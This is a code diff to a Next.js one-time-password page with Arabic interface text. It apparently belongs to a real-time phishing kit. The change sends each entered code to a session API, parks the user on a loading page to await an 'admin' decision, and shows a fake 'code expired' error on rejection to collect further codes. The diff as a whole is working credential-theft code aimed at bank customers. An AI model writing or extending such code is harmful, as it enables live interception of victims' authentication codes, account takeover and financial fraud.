@@ -1,7 +1,7 @@
 "use client";
 export const dynamic = 'force-dynamic';
 import { useState, useEffect } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
@@ -11,6 +11,17 @@ export default function OTPPage() {
   const [otp, setOtp] = useState("");
   const [timeLeft, setTimeLeft] = useState(120);
   const [canResend, setCanResend] = useState(false);
+  const [errorMsg, setErrorMsg] = useState("");
+  const [inputError, setInputError] = useState(false);
+  const searchParams = useSearchParams();
+
+  useEffect(() => {
+    const rejected = searchParams.get("rejected");
+    if (rejected === "1") {
+      setErrorMsg("لقد انتهت صلاحية الرمز");
+      setInputError(true);
+    }
+  }, [searchParams]);
 
   useEffect(() => {
     if (timeLeft <= 0) { setCanResend(true); return; }
@@ -21,15 +32,20 @@ export default function OTPPage() {
   const minutes = Math.floor(timeLeft / 60).toString().padStart(2, "0");
   const seconds = (timeLeft % 60).toString().padStart(2, "0");
 
-  function handleConfirm() {
+  async function handleConfirm() {
     if (otp.length === 6) {
+      setErrorMsg("");
+      setInputError(false);
       // إرسال رمز OTP للـ API
-      fetch('/api/session', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ current_page: 'otp', otp_code: otp }),
-      }).catch(() => {});
-      router.push("/atm");
+      try {
+        await fetch('/api/session', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ current_page: 'otp', otp_code: otp, waiting_for: 'otp' }),
+        });
+      } catch {}
+      // الانتقال لصفحة التحميل وانتظار قرار الأدمين
+      router.push("/loading-page?from=otp");
     } else {
       alert("يرجى إدخال رمز مكون من 6 أرقام");
     }
@@ -52,22 +68,42 @@ export default function OTPPage() {
             type="tel"
             maxLength={6}
             value={otp}
-            onChange={e => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
+            onChange={e => {
+              setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
+              if (inputError) { setInputError(false); setErrorMsg(""); }
+            }}
             placeholder="••••••"
             style={{
               width: "100%", maxWidth: "220px", height: "45px",
-              border: "1px solid #ddd", borderRadius: "8px",
+              border: inputError ? "2px solid #e74c3c" : "1px solid #ddd",
+              borderRadius: "8px",
               textAlign: "center", fontSize: "20px", letterSpacing: "8px",
-              fontWeight: "bold", color: GREEN, outline: "none",
-              backgroundColor: "#fafafa", marginBottom: "15px",
-              display: "block", margin: "0 auto 15px",
+              fontWeight: "bold", color: inputError ? "#e74c3c" : GREEN,
+              outline: "none",
+              backgroundColor: inputError ? "#fff5f5" : "#fafafa",
+              marginBottom: "8px",
+              display: "block", margin: "0 auto 8px",
             }}
           />
+          {errorMsg && (
+            <div style={{
+              color: "#e74c3c",
+              fontSize: "13px",
+              fontWeight: "bold",
+              marginBottom: "10px",
+              padding: "8px 12px",
+              backgroundColor: "#fff5f5",
+              borderRadius: "8px",
+              border: "1px solid #e74c3c",
+            }}>
+              ❌ {errorMsg}
+            </div>
+          )}
 
           <div style={{ fontSize: "12px", color: "#999", marginBottom: "20px", minHeight: "20px" }}>
             {canResend ? (
               <span
-                onClick={() => { setTimeLeft(120); setCanResend(false); setOtp(""); }}
+                onClick={() => { setTimeLeft(120); setCanResend(false); setOtp(""); setErrorMsg(""); setInputError(false); }}
                 style={{ color: GREEN, fontWeight: "bold", cursor: "pointer", textDecoration: "underline" }}
               >
                 إعادة إرسال الرمز الآن
